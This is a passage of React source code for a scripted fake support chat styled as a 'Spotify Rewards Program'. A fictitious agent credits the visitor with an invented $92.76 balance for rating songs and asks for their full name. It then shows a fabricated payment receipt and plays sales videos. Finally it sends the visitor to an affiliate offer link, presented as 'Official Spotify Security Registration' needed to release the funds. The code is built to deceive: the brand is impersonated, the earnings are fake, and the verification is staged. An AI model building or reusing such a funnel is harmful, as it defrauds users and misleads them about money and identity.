      setFinalPhase(18); // Phase 18: "Would you like to receive your reward for the work you've done?"
    }, 3000);

    const t2 = setTimeout(() => {
      setFinalPhase(19); // Phase 19: Typing indicator (3s)
    }, 3800);

    const t3 = setTimeout(() => {
      setFinalPhase(20); // Phase 20: "(Click the button below to continue)" + "Yes, I do!" button
    }, 6800);

    finalTimersRef.current.push(t1, t2, t3);
  };

  // User clicked "Yes, I do!"
  const handleYesIDoClick = () => {
    setHasClickedYesIDo(true);
    setFinalPhase(21); // Phase 21: Typing indicator (3s)

    const t1 = setTimeout(() => {
      setFinalPhase(22); // Phase 22: "✅ Okay, I'll continue with your registration."
    }, 3000);

    const t2 = setTimeout(() => {
      setFinalPhase(23); // Phase 23: Typing indicator (3s)
    }, 3800);

    const t3 = setTimeout(() => {
      setFinalPhase(24); // Phase 24: "At this stage, I need you to tell me your name..."
    }, 6800);

    const t4 = setTimeout(() => {
      setFinalPhase(25); // Phase 25: Typing indicator (3s)
    }, 7600);

    const t5 = setTimeout(() => {
      setFinalPhase(26); // Phase 26: "What is your full name? 👇"
    }, 10600);

    const t6 = setTimeout(() => {
      setFinalPhase(27); // Phase 27: Typing indicator (3s)
    }, 11400);

    const t7 = setTimeout(() => {
      setFinalPhase(28); // Phase 28: "(Write below)" + Name Input bar
    }, 14400);

    finalTimersRef.current.push(t1, t2, t3, t4, t5, t6, t7);
  };

  // User submits full name
  const handleNameSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const trimmed = nameInput.trim() || 'MEU NOME';
    setUserName(trimmed);
    setHasSubmittedName(true);

    setFinalPhase(29); // Phase 29: Typing indicator (2s)

    const t1 = setTimeout(() => {
      setFinalPhase(30); // Phase 30: "⏳ Checking..."
    }, 2000);

    const t2 = setTimeout(() => {
      setFinalPhase(31); // Phase 31: Typing indicator (2.5s)
    }, 3000);

    const t3 = setTimeout(() => {
      setFinalPhase(32); // Phase 32: "⏳ Just a moment..."
    }, 5500);

    const t4 = setTimeout(() => {
      setFinalPhase(33); // Phase 33: Typing indicator (3s)
    }, 6500);

    const t5 = setTimeout(() => {
      setFinalPhase(34); // Phase 34: "Everything looks good, {userName}!" card
    }, 9500);

    const t6 = setTimeout(() => {
      setFinalPhase(35); // Phase 35: Typing indicator (3s)
    }, 10500);

    const t7 = setTimeout(() => {
      setFinalPhase(36); // Phase 36: "I'm sending you the receipt for your commissions 👇"
    }, 13500);

    const t8 = setTimeout(() => {
      setFinalPhase(37); // Phase 37: Typing indicator (3.5s)
    }, 14800);

    const t9 = setTimeout(() => {
      setFinalPhase(38); // Phase 38: "⏳ Loading..." (mais lento)
    }, 18300);

    const t10 = setTimeout(() => {
      setFinalPhase(39); // Phase 39: Typing indicator (4.2s)
    }, 19800);

    const t11 = setTimeout(() => {
      setFinalPhase(40); // Phase 40: "⏳ Generating your commission withdrawal receipt..." (mais lento)
    }, 24000);

    const t12 = setTimeout(() => {
      setFinalPhase(41); // Phase 41: Typing indicator (4.0s)
    }, 25800);

    const t13 = setTimeout(() => {
      setFinalPhase(42); // Phase 42: Payment Receipt Card arrives!
    }, 29800);

    const t14 = setTimeout(() => {
      setFinalPhase(43); // Phase 43: Typing indicator (5.8s para ler o recibo com calma)
    }, 31000);

    const t15 = setTimeout(() => {
      setFinalPhase(44); // Phase 44: "(Click the button below to continue)" + "I want to claim my reward" button
    }, 36800);

    finalTimersRef.current.push(
      t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13, t14, t15
    );
  };

  /* ======================================================== */
  /* (AQUI É A VSL 2) - Clique em 'I want to claim my reward' */
  /* Mostra aviso e carrega o segundo vídeo da VSL            */
  /* ======================================================== */
  const handleClaimRewardClick = () => {
    setHasClaimedReward(true);
    setFinalPhase(45); // Phase 45: Typing indicator (3s)

    const t1 = setTimeout(() => {
      setFinalPhase(46); // Phase 46: "🚨 Your access to withdraw your commission will be granted after this short explanatory video"
    }, 3000);

    const t2 = setTimeout(() => {
      setFinalPhase(47); // Phase 47: Typing indicator (3s)
    }, 3800);

    const t3 = setTimeout(() => {
      setFinalPhase(48); // Phase 48: (AQUI É A VSL 2) - VSL 2 Video arrives!
    }, 6800);

    // Exatamente 2:30 (150 segundos) após o envio da VSL 2, inicia os disparos da próxima etapa
    const t4 = setTimeout(() => {
      handleVslUnlock();
    }, 6800 + VSL_2_DELAY_SECONDS * 1000);

    finalTimersRef.current.push(t1, t2, t3, t4);
  };

  /* ======================================================== */
  /* (AQUI É A VSL 2) - DESBLOQUEIO APÓS O SEGUNDO VÍDEO      */
  /* Dispara as 3 mensagens finais + botão oficial de registro*/
  /* ======================================================== */
  const handleVslUnlock = () => {
    if (vslUnlockedRef.current) return;
    setVslUnlocked(true);

    setFinalPhase(49); // Phase 49: Typing indicator (3s)

    const t1 = setTimeout(() => {
      setFinalPhase(50); // Phase 50: Message 1 (Congratulations!)
    }, 3000);

    const t2 = setTimeout(() => {
      setFinalPhase(51); // Phase 51: Typing indicator (3s)
    }, 3800);

    const t3 = setTimeout(() => {
      setFinalPhase(52); // Phase 52: Message 2 (Official Security Registration & Compliance)
    }, 6800);

    const t4 = setTimeout(() => {
      setFinalPhase(53); // Phase 53: Typing indicator (3s)
    }, 7600);

    const t5 = setTimeout(() => {
      setFinalPhase(54); // Phase 54: Message 3 (Important identity verification & funds release)
    }, 10600);

    const t6 = setTimeout(() => {
      setFinalPhase(55); // Phase 55: Typing indicator (2.5s)
    }, 11400);

    const t7 = setTimeout(() => {
      setFinalPhase(56); // Phase 56: Message 4 (CTA text) + Final Registration Button
    }, 13900);

    finalTimersRef.current.push(t1, t2, t3, t4, t5, t6, t7);
  };

  // Handle completing an evaluation:
  // Shows 4-second confirmation in the EXACT SAME box, then advances in-place to next song
  const handleFinishSong = (rewardAmount: number) => {
    if (isConfirmed) return;

    setIsConfirmed(true);
    setLastReward(rewardAmount);

    if (cashAudioRef.current) {
      try {
        cashAudioRef.current.currentTime = 0;
        cashAudioRef.current.play().catch(() => {});
      } catch {}
    }

    const startVal = displayBalance;
    const endVal = balance + rewardAmount;
    const startTimestamp = performance.now();

    const animateNumber = (now: number) => {
      const progress = Math.min(1, (now - startTimestamp) / 800);
      const current = startVal + (endVal - startVal) * (1 - Math.pow(1 - progress, 3));
      setDisplayBalance(current);

      if (progress < 1) {
        requestAnimationFrame(animateNumber);
      } else {
        setBalance(endVal);
        setDisplayBalance(endVal);
      }
    };

    requestAnimationFrame(animateNumber);

    if (confirmTimerRef.current) clearTimeout(confirmTimerRef.current);

    // Keep confirmation displayed for exactly 4 seconds, then update in-place
    confirmTimerRef.current = setTimeout(() => {
      if (songIndex < songs.length - 1) {
        setSongIndex((i) => i + 1);
        setIsConfirmed(false);
      } else {
        // All 6 tracks completed! Advance to final verification sequence
        setFinalStage(true);
        startFinalSequence();
      }
    }, 4000);
  };

  const messagesEndRef = useRef<HTMLDivElement | null>(null);

  const scrollToBottom = (smooth = true) => {
    const el = scrollRef.current;
    if (!el) return;
    el.scrollTo({
      top: el.scrollHeight + 1000,
      behavior: smooth ? 'smooth' : 'auto',
    });
  };

  // Auto-scroll suavemente para manter sempre a mensagem ou elemento mais recente visível
  useEffect(() => {
    if (loading) return;
    scrollToBottom(true);
    const t1 = setTimeout(() => scrollToBottom(true), 60);
    const t2 = setTimeout(() => scrollToBottom(true), 250);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [
    loading,
    chatStep,
    songIndex,
    isConfirmed,
    finalStage,
    finalPhase,
    hasClickedWithdraw,
    hasClickedYesIDo,
    hasSubmittedName,
    hasClaimedReward,
    vslUnlocked,
  ]);

  // Observer para rolar suavemente sempre que o conteúdo mudar ou expandir
  useEffect(() => {
    if (loading) return;
    const container = scrollRef.current;
    if (!container) return;

    let rafId: number | null = null;
    const scheduleScroll = () => {
      if (rafId) cancelAnimationFrame(rafId);
      rafId = requestAnimationFrame(() => {
        scrollToBottom(true);
      });
    };

    const resizeObserver = new ResizeObserver(() => {
      scheduleScroll();
    });

    const mutationObserver = new MutationObserver(() => {
      scheduleScroll();
    });

    resizeObserver.observe(container);
    mutationObserver.observe(container, {
      childList: true,
      subtree: true,
      attributes: true,
    });

    return () => {
      if (rafId) cancelAnimationFrame(rafId);
      resizeObserver.disconnect();
      mutationObserver.disconnect();
    };
  }, [loading]);

  return (
    <div className="app-viewport">
      {/* Meta Pixel & CAPI Tracker exclusively for Spotify Rewards */}
      <MetaPixelTracker eventName="PageView" customData={{ content_name: 'Spotify Rewards Interactive Funnel', value: 92.76, currency: 'USD' }} />

      <audio
        ref={cashAudioRef}
        src="/assets/aistudio/cash-confirmation_afe3456e.mp3"
        preload="auto"
      />

      <div className="app-frame">
        {loading ? (
          <LoadingScreen onFinish={() => setLoading(false)} />
        ) : (
          <>
            <ChatHeader balance={displayBalance} />

            <section className="agent-bar">
              <div className="agent-avatar">
                <Image
                  src="/agent-avatar.jpg"
                  alt="Kaitlynn W."
                  width={52}
                  height={52}
                  priority
                  referrerPolicy="no-referrer"
                />
              </div>
              <div className="agent-info">
                <b>Kaitlynn W.</b>
                <small>
                  <i className="status-dot" /> Live Support Agent
                </small>
              </div>
            </section>

            <main className="messages-area" ref={scrollRef}>
              {/* STEP 0: Typing Message 1 */}
              {chatStep === 0 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 1+: Message 1 */}
              {chatStep >= 1 && (
                <MessageBubble showAvatar={chatStep === 1}>
                  <b>To begin your service,</b> your case number is{' '}
                  <u>{sessionId}</u>
                </MessageBubble>
              )}

              {/* STEP 2: Typing Message 2 */}
              {chatStep === 2 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 3+: Message 2 */}
              {chatStep >= 3 && (
                <MessageBubble showAvatar={chatStep === 3}>
                  You&apos;ve been <b>one of the few people</b> selected for the{' '}
                  <b>Spotify Rewards Program</b>
                </MessageBubble>
              )}

              {/* STEP 4: Typing Message 3 */}
              {chatStep === 4 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 5+: Message 3 */}
              {chatStep >= 5 && (
                <MessageBubble showAvatar={chatStep === 5}>
                  <b>
                    We&apos;ve selected six music evaluation jobs for you to listen to and rate.
                    Get started right here below.
                  </b>{' '}
                  👇
                </MessageBubble>
              )}

              {/* STEP 6: Typing Song Card */}
              {chatStep === 6 && (
                <TypingIndicator showAvatar={true} />
              )}

              {/* STEP 7+: Single Persistent Music Evaluation Box in Conversation (no duplicates, in-place 4s confirmation) */}
              {chatStep >= 7 && (
                <MusicEvaluationBox
                  song={currentSong}
                  isConfirmed={isConfirmed}
                  lastReward={lastReward}
                  totalBalance={Math.max(displayBalance, 92.76)}
                  isFinalSong={songIndex === songs.length - 1}
                  showAvatar={!finalStage}
                  onComplete={handleFinishSong}
                />
              )}

              {/* Final Verification Flow (after all 6 tracks) */}
              {finalStage && (
                <div className="final-stage-wrap">
                  {/* Step 1: Typing before Message 4 (Spotify) */}
                  {finalPhase === 1 && (
                    <TypingIndicator showAvatar={true} isAgent={false} />
                  )}

                  {/* Step 2+: Message 4 */}
                  {finalPhase >= 2 && (
                    <MessageBubble showAvatar={false}>
                      <u>Click the button below to continue with your registration.</u>
                    </MessageBubble>
                  )}

                  {/* Step 3: Typing before Message 5 (Spotify) */}
                  {finalPhase === 3 && (
                    <TypingIndicator showAvatar={true} isAgent={false} />
                  )}

                  {/* Step 4+: Message 5 */}
                  {finalPhase >= 4 && (
                    <>
                      <MessageBubble showAvatar={true}>
                        <em>(Click the button below to continue with your withdrawal)</em>
                      </MessageBubble>

                      {finalPhase === 4 && (
                        <button
                          type="button"
                          className="verification-btn pop-bounce"
                          onClick={handleStartVerification}
                        >
                          Start Verification
                        </button>
                      )}
                    </>
                  )}

                  {/* Step 6+: Kaitlynn joined notice (enviada imediatamente sem digitando) */}
                  {finalPhase >= 6 && (
                    <div className="joined-row msg-anim">
                      <div className="msg-bubble">
                        <b>
                          ✅ Kaitlynn, the Spotify Rewards representative, has
                          joined the chat
                        </b>
                      </div>
                    </div>
                  )}

                  {/* Step 7: Typing before welcome message */}
                  {finalPhase === 7 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Step 8+: Welcome message from Kaitlynn */}
                  {finalPhase >= 8 && (
                    <MessageBubble showAvatar={finalPhase === 8} isAgent={true}>
                      👋 Hi, welcome to the <b>Spotify Rewards</b>!
                    </MessageBubble>
                  )}

                  {/* Step 9: Typing before Video Card */}
                  {finalPhase === 9 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Step 10+: Video Card (First VSL - Vertical VTurb 9:16) */}
                  {finalPhase >= 10 && (
                    <div className="card-shell msg-anim video-card-shell vturb-first-vsl-shell">
                      {finalPhase === 10 && <AgentAvatar />}
                      <div className="video-card vturb-card" style={{ padding: 0 }}>
                        <VturbPlayer
                          playerId="6aea9d1f344acaded5c15a14"
                          scriptSrc="https://scripts.converteai.net/8876e57a-2922-426e-83f1-74b43990df6f/players/6aea9d1f344acaded5c15a14/v4/player.js"
                          aspectPadding="177.53120665742026%"
                          maxWidth="400px"
                        />
                      </div>
                    </div>
                  )}

                  {/* Step 11: 15s after video -> Typing before Message 1 */}
                  {finalPhase === 11 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Step 12+: Message 1 */}
                  {finalPhase >= 12 && (
                    <MessageBubble showAvatar={finalPhase === 12} isAgent={true}>
                      You have a balance of{' '}
                      <b>
                        $
                        {(displayBalance || 92.76)
                          .toFixed(2)
                          .replace('.', ',')}
                      </b>{' '}
                      in our app
                    </MessageBubble>
                  )}

                  {/* Step 13: Typing before Message 2 */}
                  {finalPhase === 13 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Step 14+: Message 2 */}
                  {finalPhase >= 14 && (
                    <MessageBubble showAvatar={finalPhase === 14} isAgent={true}>
                      Would you like to continue so you can withdraw{' '}
                      <b>your money?</b>
                    </MessageBubble>
                  )}

                  {/* Step 15: Typing before Message 3 */}
                  {finalPhase === 15 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Step 16+: Message 3 & "Yes, I would like to withdraw" Button */}
                  {finalPhase >= 16 && (
                    <>
                      <MessageBubble showAvatar={finalPhase === 16 && !hasClickedWithdraw} isAgent={true}>
                        <em>(Click the button below to continue)</em>
                      </MessageBubble>

                      {!hasClickedWithdraw && (
                        <button
                          type="button"
                          className="verification-btn pop-bounce"
                          onClick={handleWithdrawClick}
                        >
                          Yes, I would like to withdraw
                        </button>
                      )}
                    </>
                  )}

                  {/* User sent message: Yes, I would like to withdraw */}
                  {hasClickedWithdraw && (
                    <UserBubble>Yes, I would like to withdraw</UserBubble>
                  )}

                  {/* Phase 17: Typing before Question */}
                  {finalPhase === 17 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 18+: Question from Kaitlynn */}
                  {finalPhase >= 18 && (
                    <MessageBubble showAvatar={finalPhase === 18} isAgent={true}>
                      Would you like to receive your reward for the work you&apos;ve done?
                    </MessageBubble>
                  )}

                  {/* Phase 19: Typing before (Click the button below to continue) */}
                  {finalPhase === 19 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 20+: Instruction & "Yes, I do!" Button */}
                  {finalPhase >= 20 && (
                    <>
                      <MessageBubble showAvatar={finalPhase === 20 && !hasClickedYesIDo} isAgent={true}>
                        <em>(Click the button below to continue)</em>
                      </MessageBubble>

                      {!hasClickedYesIDo && (
                        <button
                          type="button"
                          className="verification-btn pop-bounce"
                          onClick={handleYesIDoClick}
                        >
                          &ldquo;Yes, I do!&rdquo;
                        </button>
                      )}
                    </>
                  )}

                  {/* User sent message: "Yes, I do!" */}
                  {hasClickedYesIDo && (
                    <UserBubble>&ldquo;Yes, I do!&rdquo;</UserBubble>
                  )}

                  {/* Phase 21: Typing before registration message */}
                  {finalPhase === 21 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 22+: Registration message */}
                  {finalPhase >= 22 && (
                    <MessageBubble showAvatar={finalPhase === 22} isAgent={true}>
                      <b>✅ Okay, I&apos;ll continue with your registration.</b>
                    </MessageBubble>
                  )}

                  {/* Phase 23: Typing before name request info */}
                  {finalPhase === 23 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 24+: Name request info */}
                  {finalPhase >= 24 && (
                    <MessageBubble showAvatar={finalPhase === 24} isAgent={true}>
                      At this stage, I need you to tell me <b>your name</b> so I can verify that you&apos;re a <b>new user.</b>
                    </MessageBubble>
                  )}

                  {/* Phase 25: Typing before "What is your full name? 👇" */}
                  {finalPhase === 25 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 26+: "What is your full name? 👇" */}
                  {finalPhase >= 26 && (
                    <MessageBubble showAvatar={finalPhase === 26} isAgent={true}>
                      <b>What is your full name? 👇</b>
                    </MessageBubble>
                  )}

                  {/* Phase 27: Typing before (Write below) */}
                  {finalPhase === 27 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 28+: (Write below) & Interactive Chat Input */}
                  {finalPhase >= 28 && (
                    <>
                      <MessageBubble showAvatar={finalPhase === 28 && !hasSubmittedName} isAgent={true}>
                        <em>(Write below)</em>
                      </MessageBubble>

                      {!hasSubmittedName && (
                        <form onSubmit={handleNameSubmit} className="name-input-card">
                          <div className="name-input-header">
                            <span className="name-input-badge">
                              <span className="pulse-dot" />
                              Required Step
                            </span>
                            <span style={{ fontSize: 11, color: '#666666', fontWeight: 700 }}>
                              Step 2 of 3
                            </span>
                          </div>

                          <div className="name-input-instruction">
                            <User size={18} className="text-[#1db954] shrink-0 mt-0.5" />
                            <span>Type your full name to generate your receipt 👇</span>
                          </div>

                          <div className="name-input-row">
                            <div className="name-input-field-wrap">
                              <input
                                type="text"
                                className="name-input-field"
                                placeholder="e.g. Johnathan Smith"
                                value={nameInput}
                                onChange={(e) => setNameInput(e.target.value)}
                                autoFocus
                              />
                            </div>
                            <button
                              type="submit"
                              className="name-submit-btn"
                              disabled={!nameInput.trim()}
                              aria-label="Confirm name"
                            >
                              <span>CONFIRM</span>
                              <Send size={15} fill="currentColor" />
                            </button>
                          </div>

                          <div className="name-input-footer">
                            <Info size={14} className="text-[#1db954] shrink-0 mt-0.5" />
                            <span>This name will be printed on your official $92.76 payment voucher.</span>
                          </div>
                        </form>
                      )}
                    </>
                  )}

                  {/* User sent message: typed full name */}
                  {hasSubmittedName && (
                    <UserBubble>{userName}</UserBubble>
                  )}

                  {/* Phase 29: Typing before Checking... */}
                  {finalPhase === 29 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 30+: Checking... */}
                  {finalPhase >= 30 && (
                    <MessageBubble showAvatar={finalPhase === 30} isAgent={true}>
                      ⏳ <b>Checking...</b>
                    </MessageBubble>
                  )}

                  {/* Phase 31: Typing before Just a moment... */}
                  {finalPhase === 31 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 32+: Just a moment... */}
                  {finalPhase >= 32 && (
                    <MessageBubble showAvatar={finalPhase === 32} isAgent={true}>
                      ⏳ <u>Just a moment...</u>
                    </MessageBubble>
                  )}

                  {/* Phase 33: Typing before Everything looks good card */}
                  {finalPhase === 33 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 34+: Everything looks good, {userName}! */}
                  {finalPhase >= 34 && (
                    <MessageBubble showAvatar={finalPhase === 34} isAgent={true}>
                      <div style={{ lineHeight: 1.45 }}>
                        <b>Everything looks good, {userName}!</b>
                        <div style={{ height: 12 }} />
                        I checked our system and saw that you are <b>eligible</b> to receive your commission of{' '}
                        <b>${(displayBalance || 92.76).toFixed(2)}</b>
                      </div>
                    </MessageBubble>
                  )}

                  {/* Phase 35: Typing before sending receipt message */}
                  {finalPhase === 35 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 36+: Sending receipt message */}
                  {finalPhase >= 36 && (
                    <MessageBubble showAvatar={finalPhase === 36} isAgent={true}>
                      <b>I&apos;m sending you the receipt for your commissions 👇</b>
                    </MessageBubble>
                  )}

                  {/* Phase 37: Typing before Loading... */}
                  {finalPhase === 37 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 38+: Loading... */}
                  {finalPhase >= 38 && (
                    <MessageBubble showAvatar={finalPhase === 38} isAgent={true}>
                      ⏳ <b>Loading...</b>
                    </MessageBubble>
                  )}

                  {/* Phase 39: Typing before Generating receipt... */}
                  {finalPhase === 39 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 40+: Generating your commission withdrawal receipt... */}
                  {finalPhase >= 40 && (
                    <MessageBubble showAvatar={finalPhase === 40} isAgent={true}>
                      ⏳ <b>Generating your commission withdrawal receipt...</b>
                    </MessageBubble>
                  )}

                  {/* Phase 41: Typing before Payment Receipt */}
                  {finalPhase === 41 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 42+: Payment Receipt */}
                  {finalPhase >= 42 && (
                    <PaymentReceipt
                      userName={userName}
                      totalAmount={displayBalance || 92.76}
                      refNumber="SP-424467"
                      showAvatar={finalPhase === 42}
                    />
                  )}

                  {/* Phase 43: Typing before continue message */}
                  {finalPhase === 43 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 44+: Continue message & "I want to claim my reward" button */}
                  {finalPhase >= 44 && (
                    <>
                      <MessageBubble showAvatar={finalPhase === 44 && !hasClaimedReward} isAgent={true}>
                        <em>(Click the button below to continue)</em>
                      </MessageBubble>

                      {!hasClaimedReward && (
                        <button
                          type="button"
                          className="verification-btn pop-bounce"
                          onClick={handleClaimRewardClick}
                        >
                          I want to claim my reward
                        </button>
                      )}
                    </>
                  )}

                  {/* User sent message: I want to claim my reward */}
                  {hasClaimedReward && (
                    <UserBubble>I want to claim my reward</UserBubble>
                  )}

                  {/* Phase 45: Typing before Video Notice */}
                  {finalPhase === 45 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 46+: Video Notice */}
                  {finalPhase >= 46 && (
                    <MessageBubble showAvatar={finalPhase === 46} isAgent={true}>
                      <b>🚨 Your access to withdraw your commission will be granted after this short explanatory video</b>
                    </MessageBubble>
                  )}

                  {/* Phase 47: Typing before VSL 2 Video */}
                  {finalPhase === 47 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* ======================================================== */}
                  {/* (AQUI É A VSL 2) - Player do Segundo Vídeo na Conversa  */}
                  {/* ======================================================== */}
                  {/* Phase 48+: VSL 2 Video Player */}
                  {finalPhase >= 48 && (
                    <VslVideoPlayer
                      onUnlock={handleVslUnlock}
                      unlocked={vslUnlocked}
                      showAvatar={finalPhase === 48 && !vslUnlocked}
                    />
                  )}

                  {/* Phase 49: Typing before Message 1 */}
                  {finalPhase === 49 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 50+: Message 1 - Validation & Reserved Balance */}
                  {finalPhase >= 50 && (
                    <MessageBubble showAvatar={finalPhase === 50} isAgent={true}>
                      🎉 <b>Congratulations!</b> Your test evaluation has been approved and your initial commission of <b>${(displayBalance || 92.76).toFixed(2)}</b> has been temporarily reserved on your case protocol.
                    </MessageBubble>
                  )}

                  {/* Phase 51: Typing before Message 2 */}
                  {finalPhase === 51 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 52+: Message 2 - Official Security Registration Reason */}
                  {finalPhase >= 52 && (
                    <MessageBubble showAvatar={finalPhase === 52} isAgent={true}>
                      🛡️ To officially join the <b>Spotify Rewards</b> program and unlock daily earnings of <b>up to $350/day</b>, you will now proceed to the <b>Official Spotify Security Registration</b>.
                      <br /><br />
                      Due to high demand and strict compliance policies, Spotify requires this final verification step to prevent automated bots, multiple duplicate accounts, and fraudulent activity.
                    </MessageBubble>
                  )}

                  {/* Phase 53: Typing before Message 3 */}
                  {finalPhase === 53 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 54+: Message 3 - Requirement & Immediate Release */}
                  {finalPhase >= 54 && (
                    <MessageBubble showAvatar={finalPhase === 54} isAgent={true}>
                      ⚠️ <b>Important:</b> Complete the remaining security requirements on the next page to confirm your identity. Once verified, your <b>${(displayBalance || 92.76).toFixed(2)}</b> balance will be immediately released to your payout account.
                    </MessageBubble>
                  )}

                  {/* Phase 55: Typing before Message 4 */}
                  {finalPhase === 55 && (
                    <TypingIndicator showAvatar={true} isAgent={true} />
                  )}

                  {/* Phase 56+: Message 4 & Final CTA Button */}
                  {finalPhase >= 56 && (
                    <>
                      <MessageBubble showAvatar={finalPhase >= 56} isAgent={true}>
                        <em>(Click the button below to complete your Official Registration &amp; release your funds)</em>
                      </MessageBubble>

                      <a
                        href="https://giftclick.org/?offer_id=1970&aff_id=208871"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="verification-btn pop-bounce"
                        style={{
                          display: 'block',
                          textAlign: 'center',
                          textDecoration: 'none',
                          lineHeight: '1.3',
                          padding: '16px 20px',
                          fontSize: '15px',
                          fontWeight: 800,
                          letterSpacing: '0.02em',
                        }}
                      >
                        COMPLETE OFFICIAL REGISTRATION &amp; CLAIM ${(displayBalance || 92.76).toFixed(2)} ➔
                      </a>
                    </>
                  )}
                </div>
              )}

              <div ref={messagesEndRef} className="scroll-anchor" />
            </main>
          </>
        )}
      </div>
    </div>
  );
}
